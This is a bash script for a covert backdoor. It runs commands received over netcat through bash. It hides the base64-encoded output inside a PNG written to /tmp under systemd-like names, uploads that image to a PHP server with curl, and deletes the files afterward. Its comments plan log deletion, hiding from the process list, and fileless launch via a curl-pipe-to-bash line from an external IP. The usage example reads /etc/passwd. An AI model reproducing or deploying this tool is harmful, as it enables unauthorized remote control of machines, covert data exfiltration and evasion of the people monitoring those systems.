#!/bin/bash

# Background this listener to wait and respond to commands from a remote machine
# No authentication as of yet, designed as a remote system query tool
# Obfuscates activity by echoing a legitimate png file into the /tmp directory
# Then waits for a command to come in, base64 encodes it and then appends it to the
# end of the photo
# Then uses a simple php file upload server to upload the legitimate png with the
# base64 encoded command output using curl
# Finally, deletes the remnants

# Usage:
# Start listening server in the background
# ./listen.sh &

# Run commands to it using the cmd.sh script:
# ./cmd.sh 'cat /etc/passwd'

# TO DO:
# Delete logs
# Workout how to hide this from the ps menu (Explore /proc a bit more)
# Host externally so the file never exists on the target, will be callable with:
# curl http://external_ip/listen.sh | bash &

while true; do
	out='/tmp/systemd.timer'
	img='/tmp/systemd.timer.png'
	heartz='iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAA1VBMVEX////+AAAAAACwAADh4eH29vb6AACWAACBgYGUlJQVFRX+jo7t7e36+vrBAABOTk7GxsZqAADkAAB2AABnZ2fKAAB7e3vPz8+vr6+jAACOjo7/+fntAAA+AACkpKT/sLD+cHD/xMT+YWFvb2+CAAA0NDRMAADVAAC6urr/29s1AABmAAAfAABeXl49PT1FUFCsLS2iX1+fU1OXc3MAFxeXDw8/FhZRFBQAGBguAAD+Pz/+dHT/5eX+kpL+XFxgbGy9Hx+EUVF2gIAlNzcfHx+BTU0TAACj/feIAAAC0klEQVR4nO3dbVcSQRyGcUBBSKQlVBLJlKwosucnK1PK+v4fqXN8wdx7PHuYaXd2Ztfreovz3/nBm0XnrI0GERERERERERERERERUeltute3Gtx3ntv2I3zdcu7IanDXeW7iR3jfl3CCECFChAgRIkRYnvBNPMJxYajxpGd6u+HcO1k+0dvlvg5+7zz3g6zu5RI+1DfuQdO5A12vXzQ29YUN57lDXY4QIUKECBEiRHjnhfOcwi1dr/elKeGB89xFHmG7dW/Vx0/Njil9kRdZAx7LD3V0+WcZ/CV7sE06t/PVzG11rYTSVvZFrISpXsrgZ+6qTK1uGCFChAgRIkSI0LfwXAY/ilP47fvxqtkPXXQibWdtZbQwncYpvMhac1jcft0rUriNMEgIEWoIw4QQoYYwTKUIG4FwN3kTXszMbfhxINxN3oQ/A4Fu5U04CwS6FUKEGsIwIUSoIQwTQjfh4ap6CuMMIcL4Q4gw/hAijD+E1Rc2dcP7FsLGjin3OW9fpU9B7+iWHYtVGM9ZfV8hRIgwfAgRIgwfQvuSs91Vl1d7UumoqV59uSvlEqbSJ3+cly4c6MdW3JM/UunTWwo8if4/whKeT4MQIUKECBEirKtQn7Jb/l3bXgnCcWKaj0zDgS+VXGS01KvbPYE5V319R92f3GGZXuSJfxRChAgRIkSIECHC3MICf/Hr3pHuZJoPNdJZIVGpihSe3i2h8+kYXyFEiDB8CBEiDF/9hcm+6dfVwGR3YmMqKwZLmVX21wnLfstnYPfXjef6sc1D7399T2W7dk9HRBhbCBGG3v/6ECIMvf/1Iay+8Fq2W8+7trE0XwxXLVInNkbmheEfXVLCKYsiy/5vMn/lhbPQ28xRtvAVwoqEEGH8IUQYfwgRVqyeckNvxkspYXv9z1cvhNUPYfVDWP0QVr/6Cye1FyYTUzeacyRERERERERERERERERE9v0DwOi3Qym9ShEAAAAASUVORK5CYIJhdjBjYWQwCg=='
	printf '%s' $heartz  > $out
	cat $out | base64 -d > $img
	nc -l 127.0.0.1 13337 | bash | base64 | tr -d '\n' >> $img

	#https://stackoverflow.com/questions/12667797/using-curl-to-upload-post-data-with-files
	curl -F "fileToUpload=@$img" -F "submit=Upload Image" http://localhost/upload.php
	rm -rf $out $img
done